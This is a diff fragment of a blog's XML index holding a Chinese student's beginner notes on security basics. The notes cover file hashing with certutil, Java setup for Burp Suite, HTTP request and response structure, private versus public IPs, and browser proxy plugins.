+<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
+<p>如</p>
+<p>certutil -hashfile  webpro.war MD5</p>
+<p>注意后面有个MD5,不然会生成一个其他的值。</p>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安基础总结二</title>
+    <url>/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/</url>
+    <content><![CDATA[<p><strong>本周重点</strong></p>
+<p><strong>1.学习进展</strong></p>
+<p>1.完成burpsuite的安装以及java环境的配置。</p>
+<p>2.完成对http协议的学习以及对url，web前端的一些浅显的了解。</p>
+<p>3.了解了公网ip和内网ip的区别.</p>
+<span id="more"></span>
+
+<p><strong>2.遗留问题</strong></p>
+<p>​        <strong>1.内网IP与公网IP的联系和区别是什么。内网IP是不是有很多，而公网IP只有几个或者是某些内网IP连接一个公网IP。</strong></p>
+<p>​         <strong>2.自己电脑上设置的IP地址会不会与别人的IP地址想冲突，导致自己上不了网。</strong></p>
+<p><strong>3.下周计划</strong></p>
+<p>1.学习数据库基础</p>
+<p>2.学习SQL基础</p>
+<p>3.学习MySQL部署与使用</p>
+<p><strong>4.思考总结</strong></p>
+<p>​         <strong>首先总结一下burpsuite的安装与Java环境的配置！</strong></p>
+<p><strong>1.首先找到系统设置中的高级系统设置，点击环境变量。</strong></p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062708-feae412f-7908-4f68-ba33-568ff1651b65.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062309-ab8cf4dd-78dc-42d6-8c55-a47e3cedadfa.gif" alt="img"></p>
+<p><strong>2.找到系统变量path设置</strong></p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062542-7e15a7f3-0076-4b0f-8c92-1ca5a60fa4f6.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062311-b40a5d85-b7bc-497d-953d-f3efb211d2ed.gif" alt="img"></p>
+<p><strong>3.点击并编辑两条新的文本</strong></p>
+<p>%JAVA_HOME%\bin %JAVA_HOME%\jre\bin</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062302-c19e5f59-de13-4cb6-8981-8291facc8652.gif" alt="img"></p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062817-a06cd932-0656-4e3b-9bd1-ca7960eb396c.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062872-b4fb976d-c5fa-44da-9ffd-2791761c576f.gif" alt="img"></p>
+<p><strong>4.添加新的系统变量JAVA_HOME</strong></p>
+<p>变量值是jdk的安装路径。</p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062938-cd99e78e-4be7-4026-91e8-552b03b1cee6.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366063259-9af407bf-8cf7-42ea-ba47-33d2ea98f103.gif" alt="img"></p>
+<p><strong>5.添加CLASSPATH这个新的系统变量</strong></p>
+<p>变量值是 </p>
+<p>.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366063917-b33286fc-1178-46ab-b6dd-7acab372a840.gif" alt="img"></p>
+<p>切记，最前方有  .；</p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366063982-e583a5d7-21c3-4073-8b27-fd7c18617131.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366064047-80a7e79e-fc19-4e04-8db4-6f86203c3184.gif" alt="img"></p>
+<p><strong>6.配置完成后点击确定。</strong></p>
+<p><strong>7.在cmd命令中输入java -version和javac -version</strong></p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366064353-75e1c6b8-34aa-4ca2-974f-7cd94ea171a2.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366064407-b4ff7bdc-d542-42f5-b1da-6eba6d7c0c4b.gif" alt="img"></p>
+<p>若出现版本号，则Java环境配置成功。</p>
+<p>后面的burpsuite安装过程很简单，这里不细讲。</p>
+<hr>
+<p>​                          <strong>第二，总结一下http协议</strong></p>
+<p><strong>Request请求数据包</strong></p>
+<p>HTTP规划定义了8种可能的请求方法:</p>
+<p>1 GET:检索URL中标识资源的一个简单请求</p>
+<p>2HEAD:与GET方法相同， 服务器只返回状态行和头标，并不返回请求文档</p>
+<p>3 POST: 服务器接受被写入客户端输出流中的数据的请求</p>
+<p>4PUT:服务器保存请求数据作为指定URI新内容的请求</p>
+<p>5DELETE:服务器删除URL中命令的资源的请求</p>
+<p>6OPTIONS:关于服务器支持的请求方法信息的请求</p>
+<p>7 TRACE: web服务器反馈Http请求和其头标的请求</p>
+<p>8 CONNECT :已文档化，但当前未实现的一个方法，预留做隧道处理</p>
+<p>例如：</p>
+<p>请求行     GET /index.html HTTP/1.1</p>
+<p>请求方法：GET    请求url：index.html   HTTP版本：HTTP/1.1</p>
+<p>​                                                                                                       <strong>划重点！！！</strong></p>
+<p><strong>下面用chrome浏览器对某一网页进行检查</strong></p>
+<p>我们随便进入一个网页如下图</p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366519046-3e22d4cb-35a5-43a4-8fff-bb784d430c7d.png" alt="img"></p>
+<p>然后点击network</p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366577455-cf0bf193-ab72-4cf7-b541-79a51ecd6e63.png" alt="img"></p>
+<p>按住ctrl+r</p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366610192-8c8d1065-d648-4a5c-9db6-ccae8fdc9937.png" alt="img"></p>
+<p>就可以得到这一网站里的内容，<strong>这就类似于burp suite的抓包</strong></p>
+<p><strong>我们看一下请求数据包request header</strong></p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366748992-dd527888-897e-48e3-8fd8-67789024a49d.png" alt="img"></p>
+<p>可以清楚的看到，他的请求数据包里的<strong>请求行</strong>是GET————一直到HTTP/1.1</p>
+<p>GET后的一大串内容则是检索URL中的标识资源。</p>
+<p><em><strong>我们说一下url的组成</strong></em></p>
+<p>URL简单来说就是输入地址栏里的一大串网址，按此网页的地址栏内的网址为例<a href="https://ayitsec.yuque.com/staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG">https://ayitsec.yuque.com/staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG</a></p>
+<p> 第一部分是url方案，方案可以告知web客户端要怎么访问资源。这里是https://，也就是https协议。常见的还有http、ftp等。<br>第二部分指定服务器的位置，这部分告知web客户端资源的位置。例子中是ayitsec.yuque.com<br>第三部分是资源路径，路径说明了资源在服务器的位置。也即是例子中的</p>
+<p>staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG  </p>
+<p><strong>我的理解：</strong></p>
+<p><strong>1.请求行下面的都是请求头，其中HOST请求头里面的内容则是url中的第二部分——指定服务器位置</strong></p>
+<p> <strong>2.我们说的http协议有八种请求方法，其中最常用的两种请求方法是get与post。</strong></p>
+<p> <strong>3.GET请求把参数放在url中，POST请求通过request body传递参数（也就是空行下的那一行）。而且GET请求对url中传送的参数有长度限制，而POST 则没有长度限制。</strong></p>
+<p> <strong>4.GET请求里，请求行中‘？’分割实际的url和参数，‘&amp;’是url指定的参数间的分隔符。所以，我们的例子中的参数就是</strong>toc_node_uuid=w9bQEpfPpVSSY8SG               </p>
+<p>请求头：</p>
+<p>1.HOST：主机或域名地址。对应网址URL中的Web名称和端口号。</p>
+<p>2.Accept:指浏览器或其他客户可以接爱的MIME文件格式。Servlet可以根据它判断并返回适当的文件格式。</p>
+<p>3.User-Agent: 是客户浏览器名称</p>
+<p>4.Accept-Langeuage: 指出浏览器可以接受的语言种类，如en或en-us， 指英语。</p>
+<p>5.connection: 用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP/1.1使用Keep-Alive为默认值， 这样，当浏览器需要多个文件时(比如一个HTML文件和相关的图形文件)，不需要每次都建立连接。（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点。</p>
+<p>6 Cookie: 浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。</p>
+<p>7 Referer: 表明产生请求的网页URL。 如比从网页/ icconcept/ index. jsp中点击一个链接到网页/icwork/ search，在向服务器发送的GET/icwork/ search中的请求中，Referer是<a href="http://hostname:8080/icconcept">http://hostname:8080/icconcept</a> /index.jsp.</p>
+<p>8 Content-Type: 用来表名request的内容类型。可以用HttpServletRequest的getContentType ()方法取得。</p>
+<p>9 Accept-Charset: 指出浏览器可以接受的字符编码。英文浏览器的默认值是IS0-8859-1.</p>
+<p>10 Accept-Encoding: 指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到web响应之后先解码，然后再检查文件格式。</p>
+<p>空行</p>
+<p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p>
+<p>请求数据</p>
+<p>使用POST传送，最常使用的是Content-Type和Content-Length头标</p>
+<p><strong>Response返回数据包数据格式</strong></p>
+<p>1.状态行：协议版本，数字形式的状态代码和状态描述，个元素之间以空格分隔</p>
+<p>2.响应头标:包含服务器类型、日期、长度、内容类型等</p>
+<p>3.空行:响应头与响应体之间用空行隔开</p>
+<p>4.响应数据:浏览器会将实体内容中的数据取出来，生成相应的页面</p>
+<p>HTTP响应码:</p>
+<p>1xx: 信息，请求收到，继续处理</p>
+<p>2xx: 成功，行为被成功地接受、理解和采纳</p>
+<p>3xx: 重定向，为了完成请求，必须进一步执行的动作</p>
+<p>4xx:客户端错误</p>
+<p>5xx:服务器错误</p>
+<p>200 存在文件</p>
+<p>403 存在文件夹</p>
+<p>3xx 均可能存在</p>
+<p>404 不存在文件及文件夹</p>
+<p>500 均可能存在</p>
+<hr>
+<p>​                             <em><strong>第三.内网ip和公网ip</strong></em></p>
+<p>内网ip：路由器以内的网络。可以连接互联网，但是互联网无法直接连接内网（需要端口映射）</p>
+<p>公网IP：互联网IP地址。</p>
+<p>IP地址就像家庭地址一样，公网IP是小区地址，小区中又有很多住户，内网ip就像你家具体的门牌号，你可以从小区里出去（内网ip能连接到互联网），但是外人进入你家需要进行验证（公网IP无法直接连接到内网ip）<br>具体操作<br>用邮寄系统作比喻。有公网ip，相当于说你有一个详细的地址，你可以写信寄给别人，别人也可以用这个地址和你进行各种通讯。<br>来看看没有公网ip是一种什么局面。这就像是住在一个大院里 ，所有进出邮件都由传达室转交。如果是普通的邮件，可以放在传达室，传达室的大爷大妈看到你了就会转交给你，或者你自己去传达室看看，这不重要，反正虽然经过了一点波折，还是可以看到邮件的。假设以下如果来了个挂号，邮局的人员说：必须本人签收。传达室的大爷就说了：对不起，所有的邮件都要经过我中转~。于是邮局的人员只好把信带回去了……<br>实际情况和这个差不多，所谓没有公网ip，就是说你的机子并非直接连接上internet，而是所有通讯经过一台代理（一般是透明网关）进行中转，这时候问题就来了，就会有一些通讯无法在这种机制下顺利进行。比如两个网吧之间，网吧的机子是没有公网 ip的典型例子，通常两个网吧之间通过QQ传送文件就不是直接两台机器建立连接传输的，而是通过QQ的公网服务器进行中转传输了。又比如没有公网ip，上网玩对战游戏通常会有问题，你建立的游戏别人无法加入等等，当然通过服务提供商的公网服务器中转还是可以达成两个没有公网IP的机器进行交流的。</p>
+<hr>
+<p>​       <strong>第四：使用burp suite时浏览器的代理设置。</strong></p>
+<p><strong>1.火狐浏览器安装插件</strong></p>
+<h1 id="FoxyProxy-标准版"><a href="#FoxyProxy-标准版" class="headerlink" title="FoxyProxy 标准版"></a>FoxyProxy 标准版</h1><p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651370687313-39151ef7-4f02-4207-b095-7bc7f2a593f8.png" alt="img"></p>
+<p>2.Edge浏览器安装插件</p>
+<h1 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h1><p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651370760581-fdf5355f-64a6-4b92-afdc-51d4c5a7198a.png" alt="img"></p>
+<p>什么时候用就打开。</p>
+<ul>
+<li><strong>注：平常安装的burp suite只能抓取   http://   不能抓取   https://</strong></li>
+</ul>
 ]]></content>
       <categories>
         <category>网安基础篇</category>
